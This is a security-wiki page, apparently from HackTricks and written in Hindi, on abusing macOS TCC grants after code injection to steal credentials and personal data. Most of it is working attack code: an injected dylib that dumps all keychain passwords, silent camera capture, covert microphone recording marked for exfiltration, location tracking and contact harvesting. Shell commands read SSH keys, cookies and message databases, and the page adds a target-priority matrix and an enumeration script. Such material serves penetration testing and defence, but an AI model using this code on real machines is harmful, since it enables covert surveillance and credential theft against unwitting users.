# macOS क्रेडेंशियल और डेटा चोरी TCC अनुमतियाँ के माध्यम से

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

macOS TCC (Transparency, Consent, and Control) संवेदनशील उपयोगकर्ता डेटा तक पहुँच की रक्षा करता है। जब कोई attacker **compromises a binary that already has TCC grants**, तो वह उन अनुमतियों को विरासत में पा लेता है। यह पृष्ठ प्रत्येक डेटा-चोरी-संबंधित TCC अनुमति की शोषण क्षमता को दस्तावेज़ करता है।

> [!WARNING]
> Code injection into a TCC-granted binary (via DYLD injection, dylib hijacking, or task port) **silently inherits all its TCC permissions**. जब वही प्रक्रिया सुरक्षित डेटा पढ़ती है तो कोई अतिरिक्त प्रॉम्प्ट या सत्यापन नहीं होता है।

---

## Keychain Access Groups

### प्रमुख लक्ष्य

macOS Keychain में संग्रहित होता है:
- **Wi-Fi passwords** — सभी सहेजे गए वायरलेस नेटवर्क क्रेडेंशियल्स
- **Website passwords** — Safari, Chrome (when using Keychain), और अन्य ब्राउज़र पासवर्ड
- **Application passwords** — ईमेल खाते, VPN क्रेडेंशियल्स, डेवलपमेंट टोकन
- **Certificates and private keys** — code signing, client TLS, S/MIME एन्क्रिप्शन
- **Secure notes** — उपयोगकर्ता द्वारा संग्रहित गुप्त जानकारी

### Entitlement: `keychain-access-groups`

Keychain के आइटम **access groups** में व्यवस्थित होते हैं। किसी एप्लिकेशन का `keychain-access-groups` entitlement यह सूचीबद्ध करता है कि वह किन समूहों तक पहुँच सकता है:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## कैमरा एक्सेस (kTCCServiceCamera)

### शोषण

किसी बाइनरी को कैमरा TCC ग्रांट होने पर (के माध्यम से `kTCCServiceCamera` या `com.apple.security.device.camera` entitlement) यह फोटो और वीडियो कैप्चर कर सकता है:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> **macOS Sonoma** से शुरू होकर, मेनू बार में कैमरा संकेत स्थायी है और इसे प्रोग्रामेटिक रूप से छिपाया नहीं जा सकता। पुराने **macOS** संस्करणों में, एक संक्षिप्त कैप्चर एक ध्यान देने योग्य संकेत उत्पन्न नहीं कर सकता।

---

## माइक्रोफ़ोन एक्सेस (kTCCServiceMicrophone)

### शोषण

माइक्रोफ़ोन एक्सेस बिल्ट-इन माइक, हेडसेट, या जुड़े हुए ऑडियो इनपुट डिवाइसेज़ से सभी ऑडियो कैप्चर करता है:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### हमला: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## स्थान ट्रैकिंग (kTCCServiceLocation)

### Exploitation
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### निरंतर ट्रैकिंग
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## संपर्क / कैलेंडर / फ़ोटो

### व्यक्तिगत डेटा निकासी

| TCC सेवा | फ़्रेमवर्क | डेटा |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | नाम, ईमेल, फ़ोन, पते |
| `kTCCServiceCalendar` | `EventKit` | बैठकें, प्रतिभागी, स्थान |
| `kTCCServicePhotos` | `Photos.framework` | फ़ोटो, स्क्रीनशॉट, स्थान मेटाडेटा |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### संपर्क निकालना
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud खाता एक्सेस

### Entitlement: `com.apple.private.icloud-account-access`

यह entitlement `com.apple.iCloudHelper` XPC service के साथ संचार करने की अनुमति देता है, और निम्न तक पहुँच प्रदान करता है:
- **iCloud tokens** — उपयोगकर्ता के Apple ID के लिए प्रमाणीकरण टोकन
- **iCloud Drive** — सभी उपकरणों से सिंक किए गए दस्तावेज़
- **iCloud Keychain** — सभी Apple उपकरणों में सिंक किए गए पासवर्ड
- **Find My** — उपयोगकर्ता के सभी Apple उपकरणों का स्थान
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> किसी iCloud-entitled binary का समझौता करना हमला **एकल डिवाइस से पूरे Apple ecosystem** तक बढ़ा देता है: अन्य Macs, iPhones, iPads, Apple Watch। iCloud Keychain sync का अर्थ है कि सभी डिवाइसों के पासवर्ड एक्सेस किए जा सकते हैं।

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### सबसे शक्तिशाली TCC Permission

Full Disk Access सिस्टम की **हर फ़ाइल** पढ़ने की क्षमता देता है, जिसमें शामिल हैं:
- अन्य ऐप्स का डेटा (Messages, Mail, Safari history)
- TCC databases (अन्य सभी permissions का खुलासा)
- SSH keys और configuration
- Browser cookies और session tokens
- Application databases और caches
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation Priority Matrix

जब injectable TCC-granted binaries का आकलन करते हैं, तो डेटा मूल्य के आधार पर प्राथमिकता दें:

| प्राथमिकता | TCC Permission | क्यों |
|---|---|---|
| **Critical** | Full Disk Access | सब कुछ तक पहुँच |
| **Critical** | TCC Manager | किसी भी अनुमति दे सकता है |
| **High** | Keychain Access Groups | सभी संग्रहीत पासवर्ड |
| **High** | iCloud Account Access | कई डिवाइसों का समझौता |
| **High** | Input Monitoring (ListenEvent) | Keylogging |
| **High** | Accessibility | GUI control, self-granting |
| **Medium** | Screen Capture | दृश्य डेटा कैप्चर |
| **Medium** | Camera + Microphone | निगरानी |
| **Medium** | Contacts + Calendar | Social engineering data |
| **Low** | Location | भौतिक ट्रैकिंग |
| **Low** | Photos | व्यक्तिगत डेटा |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## संदर्भ

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../banners/hacktricks-training.md}}
